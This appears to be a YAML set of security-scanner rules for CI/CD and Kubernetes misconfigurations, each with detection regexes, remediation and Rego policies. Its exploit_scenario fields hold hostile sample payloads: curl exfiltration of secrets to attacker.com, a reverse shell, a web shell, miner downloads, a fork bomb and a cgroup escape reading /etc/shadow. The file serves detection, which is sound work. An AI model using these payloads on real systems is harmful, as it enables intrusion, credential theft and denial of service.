- rule_id: DEVOPS-YAML-005
  title: CI/CD Pipeline Secret Exposure
  description: 'Detects CI/CD pipeline configurations that may expose secrets through logging, artifact caching, insecure environment variable handling, or command-line argument passing. Secrets printed
    to CI/CD logs are typically stored indefinitely and accessible to anyone with build log access, third-party integrations, and webhook consumers.

    '
  language: yaml
  category: devops
  severity: Medium
  confidence: 0.8
  cwe: CWE-532
  owasp: A09:2021-Security-Logging-and-Monitoring-Failures
  tags:
  - ci-cd
  - github-actions
  - gitlab-ci
  - secret-exposure
  - log-injection
  - credential-leak
  - jenkins
  - azure-devops
  patterns:
  - type: regex
    pattern: echo\s+\$\{\{\s*secrets\.\w+
  - type: regex
    pattern: echo\s+\$(?:SECRET|TOKEN|PASSWORD|API_KEY|AWS_SECRET)
  - type: regex
    pattern: run\s*:\s*[|>]?\s*\n\s*(?:echo|printf|cat)\s+.*(?:\$\{\{secrets|%SECRET%|\$SECRET|\$TOKEN)
  - type: regex
    pattern: env\s*:\s*\n(?:\s+\w+:\s*\$\{\{secrets\.\w+\}\}\s*\n)+
  - type: regex
    pattern: (?:curl|wget|httpie)\s+.*(?:Authorization|Bearer|token|api[_-]key)\s*[:=]\s*\$\{\{secrets\.
  - type: regex
    pattern: printenv\s+(?:SECRET|TOKEN|PASSWORD|KEY|CREDENTIAL)
  - type: regex
    pattern: set\s+-x.*\$\{\{\s*secrets\.
  - type: regex
    pattern: docker\s+(?:login|push|pull).*(?:-p|--password)\s+\$\{\{secrets\.
  - type: regex
    pattern: '>>?\s*\$GITHUB_OUTPUT.*\$\{\{secrets\.'
  - type: regex
    pattern: artifacts\s*:\s*\n(?:\s+.*\n){0,20}?\s+paths\s*:\s*\n\s+-\s*(?:.*\.env|.*credentials|.*\.key|.*\.pem)
  - type: regex
    pattern: cache\s*:\s*\n(?:\s+.*\n){0,20}?\s+paths\s*:\s*\n\s+-\s*(?:.*\.env|.*node_modules/\.cache|.*\.aws)
  - type: regex
    pattern: script\s*:\s*\n(?:\s+.*\n){0,20}?\s+-\s*(?:echo|cat|printenv)\s+.*(?:\$\w*SECRET|\$\w*TOKEN|\$\w*PASSWORD)
  anti_patterns:
  - mask
  - add-mask
  - '::add-mask::'
  - MaskInputs
  - set +x
  - gatekeeper.sh/constraint
  - calico.org/v3
  - security.istio.io
  - kube-bench
  - '# safe: value is not a secret'
  context_awareness:
    surrounding_context_patterns:
    - .github/workflows/
    - .gitlab-ci.yml
    - Jenkinsfile
    - azure-pipelines.yml
    - .circleci/config.yml
    - bitbucket-pipelines.yml
    - 'steps:'
    - 'jobs:'
    - 'stages:'
    taint_source_indicators:
    - ${{ secrets.
    - $SECRET_
    - $TOKEN_
    - credentials()
    - withCredentials
    - env.SECRET
    - 'variables:'
    taint_sink_indicators:
    - echo
    - printf
    - cat
    - printenv
    - set -x
    - '>> $GITHUB_OUTPUT'
    - 'artifacts:'
    - 'cache:'
    - curl -H
    - wget --header
    sanitization_patterns:
    - '::add-mask::'
    - add-mask
    - 'MaskInputs: true'
    - set +x
    - GITHUB_TOKEN is automatically masked
    - protected variable
    - 'masked: true'
  severity_scoring:
    severity_weight: 8
    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
    exploitability_score: 0.8
  exploit_scenario:
    attack_example: 'Secret Exfiltration via CI/CD Logs: An attacker compromises a CI/CD pipeline (e.g., through a malicious PR in a public repo that triggers a workflow, or through a supply chain attack
      on a GitHub Action). The pipeline prints secrets to build logs, which the attacker harvests. They use the stolen cloud credentials to access production infrastructure, exfiltrate data, or deploy cryptominers.

      '
    example_payload: "# Malicious step in a GitHub Actions workflow\n- name: Exfiltrate secrets\n  run: |\n    echo \"${{ secrets.AWS_SECRET_ACCESS_KEY }}\" | base64\n    curl -X POST https://attacker.com/collect\
      \ \\\n      -d \"key=${{ secrets.AWS_ACCESS_KEY_ID }}&secret=${{ secrets.AWS_SECRET_ACCESS_KEY }}\"\n# Or via artifact upload\n- name: Upload credentials\n  run: echo \"${{ secrets.KUBECONFIG }}\"\
      \ > kubeconfig.yaml\n- uses: actions/upload-artifact@v3\n  with:\n    name: config\n    path: kubeconfig.yaml\n"
    attacker_objective: 'Exfiltrate secrets from CI/CD pipeline logs, artifacts, or caches to gain unauthorized access to cloud infrastructure, container registries, and production environments.

      '
  confidence_factors:
    pattern_strength: 0.82
    context_match: 0.88
    proximity_to_user_input: 0.65
    sanitization_absence: 0.85
  impact: 'Secrets printed or logged in CI/CD pipelines are exposed in build logs,

    which may be accessible to team members, third-party integrations,

    or attackers who compromise the CI/CD system. Build artifacts and

    caches containing secrets can persist beyond the build lifecycle.

    '
  remediation: "## Kubernetes Pod Security Standards\n- Ensure CI/CD-deployed workloads follow PSS restricted profile\n- Use OIDC federation instead of long-lived secrets for cloud access\n\n## CIS Benchmark\
    \ References\n- CIS Software Supply Chain Security Guide: Section 3 - Build Pipelines\n- Never echo or print environment variables containing secrets\n\n## Helm Chart Hardening\n- Use CI/CD native secret\
    \ injection for Helm values\n- Never pass secrets via helm --set on command line (visible in process lists)\n- Use helm-secrets plugin with SOPS encryption\n\n## OPA Rego Policy\n```rego\npackage cicd.security\n\
    deny[msg] {\n  step := input.jobs[_].steps[_]\n  contains(step.run, \"echo\")\n  contains(step.run, \"secrets.\")\n  msg := \"CI/CD step echoes secrets to logs\"\n}\n```\n\n## Additional Remediation\n\
    - Use ::add-mask:: in GitHub Actions to mask values\n- Use CI/CD platform native secret management\n- Avoid passing secrets as command-line arguments (visible in process lists)\n- Audit CI/CD logs for\
    \ accidental secret exposure\n- Use OIDC tokens instead of static credentials where possible\n- Exclude .env files and credential files from artifact uploads\n- Implement pipeline security scanning\
    \ with tools like actionlint\n"
  references:
  - https://cwe.mitre.org/data/definitions/532.html
  - https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
  - https://docs.gitlab.com/ee/ci/variables/#mask-a-cicd-variable
  - https://attack.mitre.org/techniques/T1552/006/
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: stable
    detection_complexity: medium
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: true
    high_impact_flag: true
    related_rules:
    - DEVOPS-YAML-004
  detection_layer: 1
- rule_id: DEVOPS-YAML-006
  title: Container Running as Root
  description: 'Detects containers without runAsNonRoot or with explicit runAsUser: 0, indicating the container process runs as the root user (UID 0). Running as root inside containers significantly increases
    the blast radius of a container compromise, as the root user can modify system files, install packages, and exploit kernel vulnerabilities more easily.

    '
  language: yaml
  category: devops
  severity: Medium
  confidence: 0.88
  cwe: CWE-250
  owasp: A05:2021-Security-Misconfiguration
  tags:
  - kubernetes
  - root-container
  - least-privilege
  - cis-benchmark
  - pss-restricted
  - user-namespace
  - container-hardening
  patterns:
  - type: regex
    pattern: runAsUser\s*:\s*0
  - type: regex
    pattern: runAsNonRoot\s*:\s*false
  - type: regex
    pattern: USER\s+root
  - type: regex
    pattern: securityContext\s*:\s*\{[^}]*runAsUser\s*:\s*0[^}]*\}
  - type: regex
    pattern: securityContext\s*:\s*\n(?:\s+.*\n){0,20}?\s+runAsUser\s*:\s*0
  - type: regex
    pattern: runAsGroup\s*:\s*0
  - type: regex
    pattern: fsGroup\s*:\s*0
  - type: regex
    pattern: supplementalGroups\s*:\s*\[?\s*0
  - type: regex
    pattern: user\s*:\s*['"]?root['"]?
  anti_patterns:
  - 'runAsNonRoot: true'
  - 'runAsUser: 1000'
  - 'runAsUser: 65534'
  - 'pod-security.kubernetes.io/enforce: restricted'
  - constraints/K8sPSPAllowedUsers
  - gatekeeper.sh/constraint
  - kyverno.io/policy
  - kube-bench
  - calico.org/v3
  - security.istio.io
  - '# requires root for binding to port 80'
  - initContainer
  context_awareness:
    surrounding_context_patterns:
    - 'kind: Pod'
    - 'kind: Deployment'
    - 'kind: DaemonSet'
    - 'kind: StatefulSet'
    - 'securityContext:'
    - 'containers:'
    - 'podSecurityContext:'
    - Dockerfile
    taint_source_indicators:
    - values.yaml
    - '{{ .Values.securityContext'
    - 'image:'
    - FROM
    - USER
    taint_sink_indicators:
    - 'runAsUser: 0'
    - 'runAsNonRoot: false'
    - USER root
    - 'securityContext:'
    sanitization_patterns:
    - 'runAsNonRoot: true'
    - 'runAsUser: 1000'
    - 'runAsUser: 65534'
    - USER nobody
    - USER nonroot
    - USER appuser
    - pod-security.kubernetes.io/enforce
    - seccomp profile
  severity_scoring:
    severity_weight: 6
    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
    exploitability_score: 0.7
  exploit_scenario:
    attack_example: 'Kernel Exploit from Root Container: An attacker who gains code execution (e.g., via RCE vulnerability) in a container running as root (UID 0) can exploit kernel vulnerabilities (e.g.,
      DirtyPipe CVE-2022-0847, DirtyCow CVE-2016-5195) to escape the container. As root, they have the ability to load kernel modules (if capabilities allow), modify /proc/sys settings, and leverage the
      full range of system calls that would be restricted for non-root users.

      '
    example_payload: '# Verify running as root in container

      id

      # uid=0(root) gid=0(root) groups=0(root)

      # Install additional tools

      apt-get update && apt-get install -y nmap netcat

      # Attempt kernel exploit (e.g., DirtyPipe)

      gcc -o exploit dirtypipe.c && ./exploit /etc/passwd

      # Modify container filesystem

      echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd

      '
    attacker_objective: 'Leverage root access within the container to exploit kernel vulnerabilities for container escape, modify system files for persistence, and install additional attack tools.

      '
  confidence_factors:
    pattern_strength: 0.9
    context_match: 0.87
    proximity_to_user_input: 0.25
    sanitization_absence: 0.88
  impact: 'Containers running as root can modify system files, install packages,

    and exploit kernel vulnerabilities for container escapes. This violates

    CIS Kubernetes Benchmark 5.2.6 and the Pod Security Standards

    restricted profile.

    '
  remediation: "## Kubernetes Pod Security Standards\n- Set runAsNonRoot: true in securityContext\n- Set runAsUser to a non-zero UID (e.g., 1000 or 65534)\n- Apply the PSS restricted profile which requires\
    \ runAsNonRoot\n\n## CIS Benchmark References\n- CIS Kubernetes Benchmark 5.2.6: Minimize the admission of root containers\n- CIS Docker Benchmark 4.1: Ensure a user for the container has been created\n\
    \n## Helm Chart Hardening\n- Default values.yaml:\n  podSecurityContext:\n    runAsNonRoot: true\n    runAsUser: 1000\n    fsGroup: 1000\n  securityContext:\n    runAsNonRoot: true\n    runAsUser: 1000\n\
    \n## OPA Rego Policy\n```rego\npackage kubernetes.admission\ndeny[msg] {\n  input.request.kind.kind == \"Pod\"\n  container := input.request.object.spec.containers[_]\n  container.securityContext.runAsUser\
    \ == 0\n  msg := sprintf(\"Container %v must not run as root (UID 0)\", [container.name])\n}\ndeny[msg] {\n  input.request.kind.kind == \"Pod\"\n  not input.request.object.spec.securityContext.runAsNonRoot\n\
    \  msg := \"Pod must set runAsNonRoot: true\"\n}\n```\n\n## Additional Remediation\n- Use distroless or minimal base images\n- Use USER directive in Dockerfiles\n- Use user namespaces for UID remapping\n\
    - Set supplementalGroups and fsGroup to non-zero values\n"
  references:
  - https://cwe.mitre.org/data/definitions/250.html
  - https://kubernetes.io/docs/concepts/security/pod-security-standards/
  - https://www.cisecurity.org/benchmark/kubernetes
  - https://attack.mitre.org/techniques/T1611/
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: stable
    detection_complexity: low
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: false
    high_impact_flag: false
    related_rules:
    - DEVOPS-YAML-001
    - DEVOPS-YAML-002
    - DEVOPS-YAML-009
    - DEVOPS-YAML-008
  detection_layer: 1
- rule_id: DEVOPS-YAML-007
  title: Missing Resource Limits
  description: 'Detects Kubernetes containers without CPU/memory resource limits, enabling resource exhaustion attacks. Without resource limits, a single container can consume all available node resources,
    starving other workloads and potentially crashing the node. This is a common vector for denial-of-service attacks within shared Kubernetes clusters.

    '
  language: yaml
  category: devops
  severity: Medium
  confidence: 0.82
  cwe: CWE-770
  owasp: A05:2021-Security-Misconfiguration
  tags:
  - kubernetes
  - resource-limits
  - denial-of-service
  - resource-management
  - cis-benchmark
  - cluster-stability
  - quality-of-service
  patterns:
  - type: regex
    pattern: 'containers\s*:\s*\n\s+-\s+name\s*:'
  - type: regex
    pattern: 'image\s*:\s*\S+\s*\n(?:(?!\s+resources\s*:).){0,500}\n\s+(?:ports|env|volumeMounts)\s*:'
  - type: regex
    pattern: containers\s*:\s*\n\s+-\s+name\s*:\s*\S+\s*\n\s+image\s*:\s*\S+\s*\n(?:(?!\s+resources).){0,500}
  - type: regex
    pattern: resources\s*:\s*\{\s*\}
  - type: regex
    pattern: resources\s*:\s*\n\s+requests\s*:\s*\n(?:(?!\s+limits\s*:).){0,500}
  - type: regex
    pattern: initContainers\s*:\s*\n\s+-\s+name\s*:\s*\S+\s*\n\s+image\s*:\s*\S+\s*\n(?:(?!\s+resources).){0,500}
  anti_patterns:
  - 'resources:'
  - 'limits:'
  - 'requests:'
  - LimitRange
  - ResourceQuota
  - pod-security.kubernetes.io/enforce
  - constraints/K8sContainerLimits
  - gatekeeper.sh/constraint
  - kyverno.io/policy
  - kube-bench
  - calico.org/v3
  - VPA
  - VerticalPodAutoscaler
  context_awareness:
    surrounding_context_patterns:
    - 'kind: Pod'
    - 'kind: Deployment'
    - 'kind: DaemonSet'
    - 'kind: StatefulSet'
    - 'kind: Job'
    - 'kind: CronJob'
    - 'containers:'
    - 'initContainers:'
    - 'spec:'
    taint_source_indicators:
    - values.yaml
    - '{{ .Values.resources'
    - 'image:'
    - 'containers:'
    taint_sink_indicators:
    - 'containers:'
    - 'initContainers:'
    - 'image:'
    - no resources block present
    sanitization_patterns:
    - 'resources:'
    - 'limits:'
    - 'requests:'
    - LimitRange
    - ResourceQuota
    - VerticalPodAutoscaler
    - HorizontalPodAutoscaler
    - pod-security.kubernetes.io
  severity_scoring:
    severity_weight: 5
    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
    exploitability_score: 0.65
  exploit_scenario:
    attack_example: 'Resource Exhaustion DoS: An attacker who gains access to a container without resource limits (e.g., via RCE vulnerability) can launch a fork bomb or memory exhaustion attack that consumes
      all CPU and memory on the node. This causes all other pods on the same node to be evicted or OOM-killed, resulting in denial of service for critical workloads including monitoring, logging, and service
      mesh sidecars.

      '
    example_payload: "# Fork bomb inside unrestricted container\n:(){ :|:& };:\n# Memory exhaustion\npython3 -c \"x = [' ' * 10**6 for _ in range(10**6)]\"\n# CPU exhaustion via cryptomining\nwget -O xmrig\
      \ https://attacker.com/xmrig && chmod +x xmrig && ./xmrig \\\n  --url=pool.attacker.com:3333 --user=wallet --threads=$(nproc)\n# Disk exhaustion (if no ephemeral storage limits)\ndd if=/dev/zero of=/tmp/fill\
      \ bs=1M count=100000\n"
    attacker_objective: 'Exhaust node CPU, memory, or disk resources to cause denial of service for co-located workloads, disrupt cluster operations, or deploy cryptominers on unrestricted compute resources.

      '
  confidence_factors:
    pattern_strength: 0.78
    context_match: 0.85
    proximity_to_user_input: 0.15
    sanitization_absence: 0.82
  impact: 'Containers without resource limits can consume all available CPU and

    memory on a node, causing denial of service for other workloads.

    This violates CIS Kubernetes Benchmark 5.4.3 and can result in

    Kubernetes BestEffort QoS class assignment, making the pod the

    first candidate for eviction under resource pressure.

    '
  remediation: "## Kubernetes Pod Security Standards\n- Set both requests and limits for CPU and memory on every container\n- Ensure Guaranteed QoS by setting requests equal to limits for critical workloads\n\
    \n## CIS Benchmark References\n- CIS Kubernetes Benchmark 5.4.3: Apply Security Context to Your Pods and Containers\n- CIS Kubernetes Benchmark 5.2.8: Ensure resource limits are set\n\n## Helm Chart\
    \ Hardening\n- Always define default resources in values.yaml:\n  resources:\n    requests:\n      cpu: 100m\n      memory: 128Mi\n    limits:\n      cpu: 500m\n      memory: 512Mi\n- Add resource validation\
    \ in Helm chart tests\n\n## OPA Rego Policy\n```rego\npackage kubernetes.admission\ndeny[msg] {\n  input.request.kind.kind == \"Pod\"\n  container := input.request.object.spec.containers[_]\n  not container.resources.limits.memory\n\
    \  msg := sprintf(\"Container %v must have memory limits\", [container.name])\n}\ndeny[msg] {\n  input.request.kind.kind == \"Pod\"\n  container := input.request.object.spec.containers[_]\n  not container.resources.limits.cpu\n\
    \  msg := sprintf(\"Container %v must have CPU limits\", [container.name])\n}\n```\n\n## Additional Remediation\n- Apply LimitRange objects for namespace-level defaults\n- Use ResourceQuota for namespace-level\
    \ totals\n- Monitor resource usage with Prometheus/Grafana\n- Use VerticalPodAutoscaler (VPA) for right-sizing\n- Set ephemeral-storage limits to prevent disk exhaustion\n"
  references:
  - https://cwe.mitre.org/data/definitions/770.html
  - https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/
  - https://www.cisecurity.org/benchmark/kubernetes
  - https://attack.mitre.org/techniques/T1499/
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: stable
    detection_complexity: medium
  cross_rule_intelligence:
    cross_file_risk_flag: false
    requires_ai_validation: true
    high_impact_flag: false
    related_rules:
    - DEVOPS-YAML-006
    - DEVOPS-YAML-008
  detection_layer: 1
- rule_id: DEVOPS-YAML-008
  title: Writable Root Filesystem
  description: 'Detects containers without readOnlyRootFilesystem set to true, or with it explicitly set to false, allowing filesystem modifications within the container. Writable root filesystems enable
    attackers to modify application binaries, install backdoors, write web shells, tamper with configuration files, and establish persistence mechanisms within the container.

    '
  language: yaml
  category: devops
  severity: Medium
  confidence: 0.84
  cwe: CWE-284
  owasp: A05:2021-Security-Misconfiguration
  tags:
  - kubernetes
  - readonly-filesystem
  - immutable-infrastructure
  - cis-benchmark
  - pss-restricted
  - container-hardening
  - defense-in-depth
  patterns:
  - type: regex
    pattern: readOnlyRootFilesystem\s*:\s*false
  - type: regex
    pattern: securityContext\s*:\s*\{[^}]*readOnlyRootFilesystem\s*:\s*false[^}]*\}
  - type: regex
    pattern: securityContext\s*:\s*\n(?:(?!readOnlyRootFilesystem).){0,500}\n\s+(?:runAs|capabilities|allowPrivilege)
  - type: regex
    pattern: 'containers\s*:\s*\n\s+-\s+name\s*:\s*\S+\s*\n(?:(?!readOnlyRootFilesystem).){0,500}\n\s+(?:ports|env|volumeMounts|resources)\s*:'
  - type: regex
    pattern: securityContext\s*:\s*\n\s+runAsNonRoot.{0,500}\n(?:(?!readOnlyRootFilesystem).){0,500}
  anti_patterns:
  - 'readOnlyRootFilesystem: true'
  - 'pod-security.kubernetes.io/enforce: restricted'
  - constraints/K8sPSPReadOnlyRootFilesystem
  - gatekeeper.sh/constraint
  - kyverno.io/policy
  - kube-bench
  - calico.org/v3
  - security.istio.io
  - '# requires writable fs for'
  - 'emptyDir:'
  context_awareness:
    surrounding_context_patterns:
    - 'kind: Pod'
    - 'kind: Deployment'
    - 'kind: DaemonSet'
    - 'kind: StatefulSet'
    - 'securityContext:'
    - 'containers:'
    - 'volumeMounts:'
    taint_source_indicators:
    - values.yaml
    - '{{ .Values.securityContext'
    - 'image:'
    - 'containers:'
    taint_sink_indicators:
    - 'readOnlyRootFilesystem: false'
    - 'securityContext:'
    - no readOnlyRootFilesystem set
    - /tmp
    - /var
    sanitization_patterns:
    - 'readOnlyRootFilesystem: true'
    - 'emptyDir: {}'
    - tmpfs
    - pod-security.kubernetes.io/enforce
    - 'volumeMounts:'
    - ConfigMap
  severity_scoring:
    severity_weight: 5
    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
    exploitability_score: 0.6
  exploit_scenario:
    attack_example: 'Web Shell Persistence via Writable Filesystem: An attacker exploits a web application vulnerability (e.g., file upload RCE) in a container with a writable root filesystem. They write
      a web shell to the application''s document root, modify the application binary to include a backdoor, or install a reverse shell that persists across container restarts (if the container is not recreated).
      They can also modify /etc/resolv.conf to redirect DNS queries to an attacker-controlled server for data exfiltration.

      '
    example_payload: '# Write a web shell

      echo ''<?php system($_GET["cmd"]); ?>'' > /var/www/html/shell.php

      # Modify application binary for persistence

      cp /bin/bash /usr/local/bin/app_backup

      echo ''#!/bin/bash\nnc -e /bin/bash attacker.com 4444 &\nexec /usr/local/bin/app_backup "$@"'' > /usr/local/bin/app

      # Tamper with DNS configuration

      echo "nameserver 10.0.0.evil" > /etc/resolv.conf

      # Install cryptominer in writable directory

      curl -o /tmp/miner https://attacker.com/miner && chmod +x /tmp/miner

      '
    attacker_objective: 'Establish persistence within the container by modifying application binaries, writing web shells, or installing backdoors that survive process restarts. Tamper with system configuration
      for DNS hijacking or credential theft.

      '
  confidence_factors:
    pattern_strength: 0.82
    context_match: 0.85
    proximity_to_user_input: 0.2
    sanitization_absence: 0.84
  impact: 'Writable root filesystems allow attackers to modify application binaries,

    install backdoors, or write to system directories within the container.

    This violates CIS Kubernetes Benchmark 5.2.7 and undermines immutable

    infrastructure principles.

    '
  remediation: "## Kubernetes Pod Security Standards\n- Set readOnlyRootFilesystem: true in securityContext\n- The PSS restricted profile recommends (but does not require) this setting\n\n## CIS Benchmark\
    \ References\n- CIS Kubernetes Benchmark 5.2.7: Minimize the admission of containers with writable root filesystems\n- CIS Docker Benchmark 5.12: Ensure the container's root filesystem is mounted as\
    \ read only\n\n## Helm Chart Hardening\n- Default values.yaml:\n  securityContext:\n    readOnlyRootFilesystem: true\n- Define emptyDir volumes for writable paths:\n  volumeMounts:\n    - name: tmp\n\
    \      mountPath: /tmp\n    - name: cache\n      mountPath: /var/cache\n  volumes:\n    - name: tmp\n      emptyDir: {}\n    - name: cache\n      emptyDir:\n        sizeLimit: 100Mi\n\n## OPA Rego Policy\n\
    ```rego\npackage kubernetes.admission\ndeny[msg] {\n  input.request.kind.kind == \"Pod\"\n  container := input.request.object.spec.containers[_]\n  not container.securityContext.readOnlyRootFilesystem\n\
    \  msg := sprintf(\"Container %v must have readOnlyRootFilesystem: true\", [container.name])\n}\ndeny[msg] {\n  input.request.kind.kind == \"Pod\"\n  container := input.request.object.spec.containers[_]\n\
    \  container.securityContext.readOnlyRootFilesystem == false\n  msg := sprintf(\"Container %v has writable root filesystem\", [container.name])\n}\n```\n\n## Additional Remediation\n- Use emptyDir volumes\
    \ for writable temporary directories\n- Use ConfigMaps and Secrets for configuration files\n- Use tmpfs mounts with size limits for temporary data\n- Build container images with all necessary files\
    \ baked in at build time\n"
  references:
  - https://cwe.mitre.org/data/definitions/284.html
  - https://kubernetes.io/docs/concepts/security/pod-security-standards/
  - https://www.cisecurity.org/benchmark/kubernetes
  - https://attack.mitre.org/techniques/T1505/003/
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: stable
    detection_complexity: medium
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: true
    high_impact_flag: false
    related_rules:
    - DEVOPS-YAML-001
    - DEVOPS-YAML-006
    - DEVOPS-YAML-009
    - DEVOPS-YAML-004
  detection_layer: 1
- rule_id: DEVOPS-YAML-009
  title: Dangerous Kubernetes Capabilities
  description: 'Detects containers granted dangerous Linux capabilities such as SYS_ADMIN, SYS_PTRACE, NET_ADMIN, NET_RAW, SYS_MODULE, DAC_OVERRIDE, or ALL. These capabilities provide near-root privileges
    and can be exploited for container escapes, network sniffing, kernel module loading, and bypassing file permission checks. The principle of least privilege requires dropping all capabilities and only
    adding specific ones that are strictly necessary.

    '
  language: yaml
  category: devops
  severity: High
  confidence: 0.93
  cwe: CWE-250
  owasp: A05:2021-Security-Misconfiguration
  tags:
  - kubernetes
  - capabilities
  - privilege-escalation
  - cis-benchmark
  - pss-restricted
  - container-escape
  - linux-capabilities
  - least-privilege
  patterns:
  - type: regex
    pattern: add\s*:\s*\n\s*-\s*(?:SYS_ADMIN|SYS_PTRACE|NET_ADMIN|NET_RAW|SYS_MODULE|DAC_OVERRIDE|ALL)
  - type: regex
    pattern: capabilities\s*:\s*\n\s+add\s*:\s*\n\s+-\s*ALL
  - type: regex
    pattern: add\s*:\s*\[\s*(?:SYS_ADMIN|ALL|NET_ADMIN|SYS_PTRACE)
  - type: regex
    pattern: add\s*:\s*\n\s*-\s*(?:SETUID|SETGID|CHOWN|FOWNER|FSETID|KILL|MKNOD|SYS_CHROOT)
  - type: regex
    pattern: add\s*:\s*\[\s*"?(?:SYS_ADMIN|ALL|NET_ADMIN|SYS_PTRACE|NET_RAW|SYS_MODULE|DAC_OVERRIDE|SETUID|SETGID)"?\s*\]
  - type: regex
    pattern: capabilities\s*:\s*\{[^}]*add\s*:\s*\[[^\]]*(?:SYS_ADMIN|ALL|NET_ADMIN|SYS_PTRACE)[^\]]*\][^}]*\}
  - type: regex
    pattern: add\s*:\s*\n(?:\s+-\s*\w+\n){3,}
  - type: regex
    pattern: securityContext\s*:\s*\n(?:\s+.*\n){0,20}?\s+capabilities\s*:\s*\n(?:\s+.*\n){0,20}?\s+add\s*:\s*\n\s+-\s*(?:SYS_ADMIN|ALL|NET_ADMIN)
  anti_patterns:
  - 'drop: ["ALL"]'
  - 'drop:

    .*ALL'
  - "drop:\n            - ALL"
  - "capabilities:\n            drop:\n              - ALL"
  - 'pod-security.kubernetes.io/enforce: restricted'
  - constraints/K8sPSPCapabilities
  - gatekeeper.sh/constraint
  - kyverno.io/policy
  - kube-bench
  - calico.org/v3
  - security.istio.io
  - '# required for debugging only'
  - '# remove before production'
  context_awareness:
    surrounding_context_patterns:
    - 'kind: Pod'
    - 'kind: Deployment'
    - 'kind: DaemonSet'
    - 'kind: StatefulSet'
    - 'securityContext:'
    - 'capabilities:'
    - 'containers:'
    - 'add:'
    - 'drop:'
    taint_source_indicators:
    - values.yaml
    - '{{ .Values.securityContext'
    - '{{ .Values.capabilities'
    - 'capabilities:'
    - 'add:'
    taint_sink_indicators:
    - 'add: [SYS_ADMIN]'
    - 'add: [ALL]'
    - 'add: [NET_ADMIN]'
    - 'add: [SYS_PTRACE]'
    - 'capabilities:'
    sanitization_patterns:
    - 'drop: ["ALL"]'
    - "drop:\n              - ALL"
    - "capabilities:\n            drop:\n              - ALL"
    - pod-security.kubernetes.io/enforce
    - PodSecurityPolicy
    - Gatekeeper constraint
  severity_scoring:
    severity_weight: 9
    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
    exploitability_score: 0.92
  exploit_scenario:
    attack_example: 'Container Escape via SYS_ADMIN Capability: An attacker in a container with CAP_SYS_ADMIN can abuse the capability to mount the host filesystem via cgroup escape (CVE-2022-0492), use
      nsenter to enter the host namespace, or mount /dev/sda directly. With NET_ADMIN, they can reconfigure network interfaces, set up ARP spoofing for man-in-the-middle attacks, or redirect traffic. With
      SYS_PTRACE, they can attach to processes in other containers sharing the same PID namespace and inject malicious code.

      '
    example_payload: '# SYS_ADMIN: cgroup escape technique

      mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp

      mkdir /tmp/cgrp/x

      echo 1 > /tmp/cgrp/x/notify_on_release

      host_path=$(sed -n ''s/.*\perdir=\([^,]*\).*/\1/p'' /etc/mtab)

      echo "$host_path/cmd" > /tmp/cgrp/release_agent

      echo ''#!/bin/bash'' > /cmd

      echo "cat /etc/shadow > $host_path/shadow_dump" >> /cmd

      chmod a+x /cmd

      echo $$ > /tmp/cgrp/x/cgroup.procs

      # NET_ADMIN: ARP spoofing

      arp -s 10.0.0.1 aa:bb:cc:dd:ee:ff

      iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443

      # SYS_PTRACE: process injection

      strace -p $(pgrep target_app) -e write

      '
    attacker_objective: 'Exploit Linux capabilities for container escape (SYS_ADMIN), network-level attacks and traffic interception (NET_ADMIN), process debugging and credential theft (SYS_PTRACE), or
      kernel module loading for rootkit deployment (SYS_MODULE).

      '
  confidence_factors:
    pattern_strength: 0.95
    context_match: 0.93
    proximity_to_user_input: 0.2
    sanitization_absence: 0.93
  impact: 'Capabilities like SYS_ADMIN, NET_ADMIN, and SYS_PTRACE provide near-root

    privileges and can be exploited for container escapes. SYS_ADMIN alone

    is essentially equivalent to full root privileges. This violates CIS

    Kubernetes Benchmark 5.2.8 and 5.2.9, and the Pod Security Standards

    restricted profile.

    '
  remediation: "## Kubernetes Pod Security Standards\n- Drop all capabilities by default: capabilities: { drop: [\"ALL\"] }\n- Add only specific needed capabilities (e.g., NET_BIND_SERVICE for port 80)\n\
    - Apply the PSS restricted profile which only allows NET_BIND_SERVICE\n\n## CIS Benchmark References\n- CIS Kubernetes Benchmark 5.2.8: Minimize the admission of containers with added capabilities\n\
    - CIS Kubernetes Benchmark 5.2.9: Minimize the admission of containers with capabilities assigned\n- CIS Docker Benchmark 5.3: Restrict Linux Kernel Capabilities within containers\n\n## Helm Chart Hardening\n\
    - Default values.yaml:\n  securityContext:\n    capabilities:\n      drop:\n        - ALL\n      add: []  # Empty by default, override only when justified\n- Document justification for any added capabilities\
    \ in chart README\n\n## OPA Rego Policy\n```rego\npackage kubernetes.admission\n\n# List of dangerous capabilities\ndangerous_caps := {\"SYS_ADMIN\", \"SYS_PTRACE\", \"NET_ADMIN\", \"NET_RAW\",\n  \
    \                  \"SYS_MODULE\", \"DAC_OVERRIDE\", \"ALL\", \"SETUID\", \"SETGID\"}\n\ndeny[msg] {\n  input.request.kind.kind == \"Pod\"\n  container := input.request.object.spec.containers[_]\n \
    \ cap := container.securityContext.capabilities.add[_]\n  dangerous_caps[cap]\n  msg := sprintf(\"Dangerous capability %v added to container %v\", [cap, container.name])\n}\n\ndeny[msg] {\n  input.request.kind.kind\
    \ == \"Pod\"\n  container := input.request.object.spec.containers[_]\n  not container.securityContext.capabilities.drop\n  msg := sprintf(\"Container %v must drop ALL capabilities\", [container.name])\n\
    }\n```\n\n## Additional Remediation\n- Use Pod Security Standards restricted profile\n- Audit capability usage with tools like kube-bench\n- Use seccomp profiles to further restrict system calls\n-\
    \ Use AppArmor profiles for mandatory access control\n- Apply Calico network policies to restrict NET_RAW at the network level\n"
